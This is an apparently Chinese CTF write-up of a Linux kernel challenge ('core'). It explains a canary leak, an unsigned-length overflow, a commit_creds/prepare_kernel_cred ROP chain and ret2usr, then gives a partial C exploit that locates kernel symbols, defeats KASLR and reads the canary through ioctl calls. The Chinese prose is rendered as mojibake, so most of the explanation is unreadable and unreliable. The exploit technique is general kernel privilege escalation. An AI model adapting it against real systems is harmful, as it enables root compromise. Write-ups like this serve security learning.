å®é™…ä¸Šæœ‰ä¸€å¤„å¼•ç”¨æ˜¯ç”¨ä½œå‡½æ•°<code>copy_from_user()</code>çš„å‚æ•°, æ‰€ä»¥æ˜¯æœ‰å†™å…¥çš„æ“ä½œçš„.</p><p>IDAç›¸åº”reference type:</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">r  <span class="hljs-keyword">Read</span><br>w  <span class="hljs-keyword">Write</span><br>rw <span class="hljs-keyword">Read</span>/<span class="hljs-keyword">Write</span><br>o  <span class="hljs-keyword">Reference</span><br></code></pre></div></td></tr></table></figure><p>æœ‰æ—¶é—´å°±çœ‹ä¸‹IDAçš„æ–‡æ¡£, è¯´ä¸å®šæœ‰æ–°ä¸œè¥¿.</p></blockquote><p>æ€»ç»“: </p><p>readå‡½æ•°æŠŠæ ˆä¸Šå†…å®¹åŠ offåcopy_to_user 64å­—èŠ‚, ä½†æ˜¯åœ¨æ­¤ä¹‹å‰å·²ç»æ¸…ç©ºè¿‡æ•°ç»„å…¨éƒ¨çš„64å­—èŠ‚.</p><p>ioctlæœ‰ä¸‰ä¸ªé€‰é¡¹, read, ä¿®æ”¹off(æ— é™åˆ¶), æŠŠbssæ®µçš„nameå˜é‡å¤åˆ¶a3å­—èŠ‚åˆ°æ ˆé¡¶ä¸Š(å°äºæ•°ç»„çš„64å­—èŠ‚, <strong>ä½†æ˜¯æ˜¯æ— ç¬¦å·æ•°</strong>). </p><p>writeå‡½æ•°copy_from_useråˆ°nameå˜é‡é‡Œ(å°äº2048å­—èŠ‚). </p><p>æ–‡ä»¶æœ‰canary+NX, æ²¡æœ‰RELRO+PIE. </p><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•:"></a>è°ƒè¯•:</h4><p>gdbä¸­ç”¨<code>target remote :1234</code>åŠ ä¸Š<code>add-symbol-file vmlinux</code>å³å¯.</p><p>é€šè¿‡æŸ¥çœ‹<code>/sys/module/sections/.text</code>æ‰¾åˆ°è¯¥moduleçš„base address, ä¸º<code>0xffffffffc0000000</code>. å½“ç„¶, è¿™æ˜¯ä¸ºäº†è°ƒè¯•, å¦åˆ™kaslræ˜¯<strong>é»˜è®¤å¼€å¯</strong>çš„, è€Œä¸”åªèƒ½è¢«rootç”¨æˆ·è¯»å–.</p><p>åæ¥åŠ ä¸Šçš„: gefæŸ¥çœ‹ksymä¸­çš„moduleç¬¦å·å¤±è´¥, åªèƒ½é€šè¿‡åœ¨qemué‡Œç”¨rootç”¨æˆ·æŸ¥çœ‹. æ²¡æ˜ç™½gefå¥½åœ¨å“ªé‡Œ. å‘½ä»¤è¿˜å°‘ä¸€ç‚¹. </p><h4 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹:"></a>è¿‡ç¨‹:</h4><blockquote><p>ä¹‹å‰åœ¨pwncollegeçš„shellcodeæ˜¯å•ç‹¬ä¸€å—åŒºåŸŸ, è¿™ä¸ªé¢˜ç›®æ˜¯åœ¨æ ˆä¸Š, å¦‚æœä½¿ç”¨äº†ä¸Šä¸€ä¸ªå‡½æ•°çš„æ ˆç©ºé—´å¯èƒ½å°±ä¼šå‡ºé—®é¢˜äº†, è¿™æ¬¡å†…æ ¸å¯èƒ½å°±çœŸçš„å´©äº†. è¿˜æ˜¯å­¦ç€ä»–é‚£æ ·åšå§, ä½¿ç”¨iret, ç”¨cçš„å†…è”æ±‡ç¼–ä¿å­˜ä¸€ç‚¹ä¸œè¥¿.</p></blockquote><ul><li>åˆ©ç”¨<code>ioctl()</code>ä¸­offæŒ‡å®šçš„leak, å¾—åˆ°canaryå’Œcore_ioctl()çš„è¿”å›åœ°å€.</li><li><code>write()</code>ä¸­æ— ç¬¦å·æº¢å‡ºè¦†ç›–, å¯å†™å…¥ä»»æ„é•¿åº¦. æ­¤æ—¶æ„å»ºROP chain.</li><li>ROP chainåŒ…æ‹¬: <ul><li>æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(0))</code>, å…¶ä¸­ä¸¤ä¸ªå†…æ ¸å‡½æ•°çš„åœ°å€è¦é€šè¿‡<code>/tmp/kallsyms</code>,<br>è¦åœ¨cé‡Œéå†æ–‡ä»¶æ‰¾åˆ°åœ°å€. </li><li>è¦æ³¨æ„çš„æ˜¯å®é™…ç¯å¢ƒä¸­kaslræ˜¯å¼€å¯çš„, è¿™é‡Œæœ‰å‡ ä¸ªæ•°å€¼éœ€è¦<strong>æå‰è®¡ç®—</strong>:<br>vmlinuxæœªå¼€aslrçš„åŸºå€: <code>0xffffffff81000000</code><br>è¿è¡Œä¸­åœ¨kallsymsé‡Œæ‰¾åˆ°çš„å‡½æ•°åœ°å€: å¯ç”¨æ¥è®¡ç®—è¿è¡Œæ—¶å†…æ ¸åŸºå€.</li><li>vmlinuxä¸­gadgetçš„åœ°å€å’Œå®é™…è¿è¡Œæ—¶çš„æœ‰åå·®, ç”±ä¸Šé¢ä¸¤ä¸ªæ•°å€¼è®¡ç®—å¾—å‡ºåå¯ä»¥æ¶ˆé™¤.<br>æ‰€ä»¥gadgetçš„åœ°å€å¯ä»¥å…ˆè¡Œå†™å‡º.</li><li>ROP chainçš„ç»“å°¾é€šè¿‡iretè¿”å›, è¿™ä¸€æ¡æŒ‡ä»¤ä¼šé¢å¤–popå‡ºcs, EFLAGS, </li><li>the processor pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers</li></ul></li><li>å†™å…¥canary+ä¿®æ”¹è¿”å›åœ°å€åˆ°ROP chain. </li><li>ç„¶åè¦è¿”å›ç”¨æˆ·æ€. WiKié‡Œç”¨äº†iret, æ‰€ä»¥è¦ä¿å­˜ä¸€ç‚¹å…¶ä»–ä¸œè¥¿. </li></ul><p>exp: (perfect exploitation)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// è§CTF-WiKi or below</span><br></code></pre></div></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* below here defined by x86-64 hardware */</span><br><span class="hljs-keyword">size_t</span> rip;<br><span class="hljs-keyword">uint32_t</span> cs;<br><span class="hljs-keyword">uint32_t</span> padding4;<br><span class="hljs-keyword">size_t</span> eflags;<br><span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br><span class="hljs-keyword">size_t</span> rsp;<br><span class="hljs-keyword">uint16_t</span> ss;  <span class="hljs-comment">//higher 48 bits are discarded</span><br></code></pre></div></td></tr></table></figure></blockquote><h3 id="Ret2user"><a href="#Ret2user" class="headerlink" title="Ret2user"></a>Ret2user</h3><p>é¢˜ç›®è¿˜æ˜¯å’Œä¸Šä¸€é¢˜ä¸€æ ·. æ¢ä¸€ç§æ–¹æ³•.</p><p>ret2usr æ”»å‡»åˆ©ç”¨äº† <strong>ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ä¸èƒ½è®¿é—®å†…æ ¸ç©ºé—´ï¼Œä½†å†…æ ¸ç©ºé—´èƒ½è®¿é—®ç”¨æˆ·ç©ºé—´</strong> è¿™ä¸ªç‰¹æ€§æ¥å®šå‘å†…æ ¸ä»£ç æˆ–æ•°æ®æµæŒ‡å‘ç”¨æˆ·æ§ä»¶ï¼Œä»¥ <code>ring 0</code> ç‰¹æƒæ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç å®Œæˆææƒç­‰æ“ä½œ.</p><p>åªèƒ½åœ¨linuxè™šæ‹Ÿæœºé‡Œé¢åšäº†, windowsä¸‹ç”¨å…±äº«æ–‡ä»¶å¤¹åŠ ä¸Šsshä¸å¥½æ•´, å†æ•´ç†ä¸€ä¸‹HOMEæ–‡ä»¶å¤¹.</p><blockquote><p>å‹ç¼©åŒ…è§£å‹å‡ºæ¥çš„vmlinuxå’Œcpioè§£å‹çš„ä¸ä¸€æ ·â€¦â€¦. å®Œå…¨æä¸æ‡‚ä¸ºä»€ä¹ˆ. æš‚ä¸”æ¢æ‰.</p></blockquote><blockquote><p><code>commit_creds(prepare_kernel_cred(0))</code> </p><ul><li><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)</code> </li><li><code>int commit_creds(struct cred *new)</code> </li></ul></blockquote><ul><li>æœ€åçš„rop_chainå†™å…¥æ˜¯é€šè¿‡ioctl, æ•°å€¼ä»<code>int64_t</code>è¢«æˆªæ–­ä¸º<code>int16_t</code>, æ‰€ä»¥æœ€åä¸¤å­—èŠ‚å¡«ä¸Šä¸€ä¸ªåˆé€‚çš„æ•°å­—å³å¯.</li><li>ä¸€å¼€å§‹å†™çš„æ—¶å€™ç›´æ¥å¾€coreä½¿ç”¨read, ä½†æ˜¯åœ¨IDAé‡Œé¢åœ¨<code>Exports</code>çª—å£é‡ŒæŸ¥çœ‹core_fopsç»“æ„ä½“é‡Œé¢æ²¡æœ‰core_readçš„æŒ‡é’ˆ, åªèƒ½åœ¨ioctlé‡Œé¢è°ƒç”¨read.</li><li>ç”±äºkallsymsæ–‡ä»¶æ˜¯åœ¨insmodä¹‹å‰å¤åˆ¶åˆ°tmpæ–‡ä»¶å¤¹ä¸‹çš„, æ‰€ä»¥å…¶ä¸­æ²¡æœ‰coreçš„å„ä¸ªå‡½æ•°åœ°å€.</li><li>parse_kallsymsé‡Œç”¨æ–‡ä»¶è¯»å–åˆæ ½äº†.<ul><li>æ²¡æœ‰æ–™åˆ°ä¸€è¡Œä¼šæœ‰å››ä¸ªå­—ç¬¦ä¸², æœ€åä¸€ä¸ª<code>[core]</code>ç”¨æ¥æŒ‡ç¤ºæ¨¡å—åç§°, å¯¼è‡´fscanfè¾“å…¥é”™è¯¯.</li><li>è¿˜æ˜¯æ¢æˆäº†<code>fgets()</code>å…ˆè¾“å…¥ä¸€è¡Œ, å†å¯¹è¿™ä¸€è¡Œè¿›è¡Œ<code>sscanf</code> </li><li><code>scanf</code>å’Œ<code>printf</code>è¦æ³¨æ„æ ¼å¼å‚æ•°, <code>scanf</code>å¯ä»¥ä½¿ç”¨<code>%LxÂ |Â %llx</code>, <code>printf</code>å¯ä»¥ä½¿ç”¨<code>%p |Â %llx</code>æ¥è¾“å‡º8å­—èŠ‚æŒ‡é’ˆçš„å€¼.</li><li>é•¿æ–‡ä»¶è¯»å–åˆ†æçš„ä¸­é—´è¦è¾“å‡ºç‚¹ä¸œè¥¿, ä¸ç„¶ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯åˆ†æå¤ªæ…¢äº†. ä¸èƒ½ä½ä¼°ç”µè„‘çš„è¿™ç‚¹è®¡ç®—èƒ½åŠ›, ä¸€å®šæ˜¯æ­»å¾ªç¯.</li></ul></li><li>è¿˜æœ‰ä¸€ä¸ªsymbol: <code>amd_uncore_read</code>ä¹ŸåŒ¹é…ä¸Šäº†<code>core_read</code>çš„å­—ç¬¦ä¸²åˆ¤æ–­. è¿˜æ˜¯ä»<code>strstr</code>æ¢æˆäº†<code>strcmp</code>.</li><li>å†…æ ¸çš„å‡½æ•°å¥½åƒéƒ½ä¸ä¼šç ´åç”¨æˆ·åŒºçš„rbp, æˆ–è€…è¯´åªç”¨rspæ¥ç´¢å¼•æ ˆä¸Šçš„æ•°å€¼.</li><li>è¯»å–æ ˆä¸Šçš„æ•°æ®å‡ºæ¥åä¸éœ€è¦strtoll, å·²ç»æ˜¯å°ç«¯æ³•å­˜å‚¨çš„size_täº†, åªè¦è½¬æ¢æŒ‡é’ˆç±»å‹ç„¶åèµ‹å€¼å³å¯.</li></ul><h4 id="æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®"><a href="#æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®" class="headerlink" title="æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®:"></a>æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®:</h4><ul><li>ç»“åˆpwn.collegeä¸­kerneléƒ¨åˆ†æ—¶çš„æŸ¥æ‰¾, å¤šäº†å‡ ä¸ªæ¦‚å¿µ: <a href="https://wiki.osdev.org/Model_Specific_Registers">MSR</a>(Model Specific Registers), <a href="https://wiki.osdev.org/SWAPGS">swapgsçš„è¶…è¯¦ç»†doc</a> |<br><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For Thread-Local Storage</a> | </li><li>(P2873 in Intel manual) one kind of MSR: Instruction-specific support (for example: SYSENTER, SYSEXIT, SWAPGS, etc.).<br>and P1866 fro swapgs instruction: SWAPGS exchanges the current GS base register value with the value contained in MSR address C0000102H(IA32_KERNEL_GS_BASE)</li><li>To acquire the kernel space stack <strong>after <code>swapgs</code></strong>, in entry_SYSCALL_64:<br><code>mov rsp, PER_CPU_VAR(cpu_current_top_of_stack)</code>,<br>expanding to <code>mov rsp, %gs:cpu_current_top_of_stack</code>,<br>GS register stores the base address for per-cpu data area. </li><li>ç”±ä¸Šé¢æ¥ä¸ªæ€»ç»“:  kernel stores the address of the <strong>per-CPU structure</strong> in MSR. </li></ul><p>å’Œpwn.collegeä¸ä¸€æ ·çš„åœ°æ–¹åœ¨äºè¿™é‡Œç ´åäº†å†…æ ¸æ ˆå¸§, å¯¹ä¸Šä¸€ä¸ªå‡½æ•°çš„æ ˆå¸§é€ æˆäº†æœªçŸ¥çš„å½±å“, æ‰€ä»¥é€‰ç”¨äº†iretç›´æ¥é€€å‡ºå†…æ ¸æ€. è€Œåœ¨pwn.collegeä¸­shellcodeè¢«å­˜æ”¾åˆ°äº†å¦ä¸€å—åŒºåŸŸ, è€Œä¸”é€šè¿‡<code>__x86_indirect_thunk_rax</code>è¿™ä¸ªå‡½æ•°é‡Œ<code>jmp rax</code>ç›´æ¥è·³è¿‡å». åœ¨codeä¸­ä½¿ç”¨retå›åˆ°äº†device_readç­‰å‡½æ•°ä¸­, æ­£å¸¸èµ°å†…æ ¸çš„æµç¨‹é€€å›åˆ°ç”¨æˆ·æ€, æ‰€ä»¥æˆ‘å°±æ²¡æœ‰å…³å¿ƒè¿‡swapgsè¿™ä¸ªçŸ¥è¯†ç‚¹. </p><h4 id="è¿˜æœ‰ä¸€ä¸ªropperçš„ä½¿ç”¨"><a href="#è¿˜æœ‰ä¸€ä¸ªropperçš„ä½¿ç”¨" class="headerlink" title="è¿˜æœ‰ä¸€ä¸ªropperçš„ä½¿ç”¨:"></a>è¿˜æœ‰ä¸€ä¸ªropperçš„ä½¿ç”¨:</h4><ul><li>ropperå¯ä»¥ä½¿ç”¨äº¤äº’å¼å‘½ä»¤è¡Œ. </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">Documented commands (<span class="hljs-built_in">type</span> <span class="hljs-built_in">help</span> &lt;topic&gt;):<br>========================================<br>arch        color           gadgets    jmp     ropchain  show       <br>asm         detailed        <span class="hljs-built_in">help</span>       load    search    stack_pivot<br>badbytes    disasm          <span class="hljs-built_in">hex</span>        opcode  semantic  string     <br>clearcache  disasm_address  imagebase  ppr     <span class="hljs-built_in">set</span>       <span class="hljs-built_in">type</span>       <br>close       file            inst       quit    settings  unset      <br><br>Undocumented commands:<br>======================<br>EOF<br></code></pre></div></td></tr></table></figure><ul><li>fileç”¨æ¥å…ˆåŠ è½½æ–‡ä»¶æˆ–è€…æ˜¾ç¤ºå·²æ‰“å¼€çš„æ–‡ä»¶</li><li>hex: å°†æ–‡ä»¶æŸä¸€éƒ¨åˆ†ç”¨hexæ‰“å°å‡ºæ¥</li><li>search: ç®€å•é€šé…ç¬¦æœç´¢, semantic: æœ‰æ¡ä»¶çš„æœç´¢</li><li>type: åœ¨ROP, JOP, SYSä¸‰ç§ç±»å‹ä¹‹ä¸­ä¿®æ”¹.</li><li>ropchainä½œç”¨æœ‰é™, åªæœ‰ä¸‰ç§æ“ä½œ.</li><li>disasm: åæ±‡ç¼–ç»™å®šçš„åå…­è¿›åˆ¶æ•°å­—ä¸²</li><li>inst: åœ¨è£…key_stoneåæŒ‰ç…§instructionæœç´¢.</li><li>show: show infomatino about the context.</li><li>ppr: pop pop ret instruction.</li><li>åœ¨å‘½ä»¤è¡Œä¸­çš„å‚æ•°ä¹ŸåŸºæœ¬åŒç†, å…¨åŠ ä¸Š<code>--</code>å³å¯.</li><li>åœ¨äº¤äº’ç•Œé¢ä¸­ç›´æ¥<code>fileÂ vmlinux;Â searchÂ swapgs;</code>å³å¯æ‰¾å‡º.</li></ul><blockquote><p>è¿˜æœ‰ä¸€ç‚¹åŒºåˆ«, å°±æ˜¯EFLAGS and RFLAGS, åœ¨64ä½ç³»ç»Ÿä¸­FLAGå¯„å­˜å™¨è¢«æ‹“å±•åˆ°64bit, <del>ä½¿ç”¨<code>popfq</code>è€Œä¸æ˜¯<code>popf</code>æ¥å¼¹å‡ºä¿å­˜åœ¨æ ˆä¸Šçš„å†…å®¹</del>. The upper 32 bits of RFLAGS is <strong>reserved</strong>.<br>POPFQ pops 64 bits from the stack. Reserved bits of RFLAGS (including the upper 32 bits of RFLAGS) are not affected.</p><p>è¿™ä¸‰ä¸ªç¼–ç éƒ½ä¸€æ ·, åªæ˜¯ç”¨åœ¨ä¸åŒçš„ç¯å¢ƒä¸‹å½“åšåŠ©è®°ç¬¦äº†. pushfå’Œpushfqéƒ½æ˜¯æŠŠrflags pushåˆ°æ ˆä¸Š. <strong>pushåŒç†</strong>. </p><table><thead><tr><th>Opcode</th><th>Instruction</th><th>Op/En</th><th>64-Bit Mode</th><th>Compat/Leg Mode</th><th>Description</th></tr></thead><tbody><tr><td>9D</td><td>POPF</td><td>ZO</td><td>Valid</td><td>Valid</td><td>Pop top of stack into <strong>lower</strong> 16 bits of EFLAGS.</td></tr><tr><td>9D</td><td>POPFD</td><td>ZO</td><td>N.E.</td><td>Valid</td><td>Pop top of stack into EFLAGS.</td></tr><tr><td>9D</td><td>POPFQ</td><td>ZO</td><td>Valid</td><td>N.E.</td><td>Pop top of stack and <strong>zero-extend</strong> into RFLAGS.</td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// gcc exp.c -static -masm=intel -g -o exp</span><br><span class="hljs-comment">// è‡³å°‘ç»å¤§éƒ¨åˆ†æ˜¯æˆ‘write by hand. è‡ªå·±åŠ¨æ‰‹è¿˜æ˜¯ä¼šå‘ç°å¾ˆå¤šç»†èŠ‚. </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEBUG 0</span><br><span class="hljs-keyword">size_t</span> commit_addr, prepare_addr;<br><span class="hljs-keyword">size_t</span> vmlinux_base, canary;<br><span class="hljs-keyword">size_t</span> user_cs, user_eflags, user_rsp, user_ss;<br><span class="hljs-keyword">int</span> proc_fd;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> VMLINUX_RAW_BASE 0xffffffff81000000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROC_PATH <span class="hljs-meta-string">&quot;/proc/core&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KAS_PATH <span class="hljs-meta-string">&quot;/proc/kallsyms&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KAS_PATH <span class="hljs-meta-string">&quot;/tmp/kallsyms&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">// read two function address from file</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_kallsyms</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *kas_fd = fopen(KAS_PATH, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (kas_fd == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] open %s fail!&quot;</span>, KAS_PATH);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">150</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">60</span>];<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (fgets(buf, <span class="hljs-number">150</span>, kas_fd) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%Lx %*c %s&quot;</span>, &amp;addr, name);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>            commit_addr = addr;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>            prepare_addr = addr;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;core_ioctl&quot;</span>))<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ioctl addr: %p\n&quot;</span>, addr);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;core_read&quot;</span>))<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;core_read addr: %p\n&quot;</span>, addr);<br>        i++;<br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t%s&quot;</span>, name);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_creds addr: %p\n&quot;</span>, commit_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_addr);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pause for core_read breakpoint&quot;</span>);<br>    getchar();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    In [8]: hex(elf.symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000)</span><br><span class="hljs-comment">    Out[8]: &#x27;0x9c8e0&#x27;    */</span><br>    vmlinux_base = commit_addr - <span class="hljs-number">0x9c8e0</span>;<br>&#125;<br><br><span class="hljs-comment">// get canary from ioctl</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_off</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> offset)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(proc_fd, <span class="hljs-number">0x6677889C</span>, offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Set off as %d\n&quot;</span>, offset);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">read_proc</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] read to buf.&quot;</span>);<br>    ioctl(proc_fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_canary</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    set_off(<span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">64</span>];<br>    read_proc(buf);<br>    <span class="hljs-comment">// canary = strtoull(buf, NULL, 16);</span><br>    canary = *((<span class="hljs-keyword">size_t</span> *)buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;canary: 0x%x\n&quot;</span>, canary);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_context</span><span 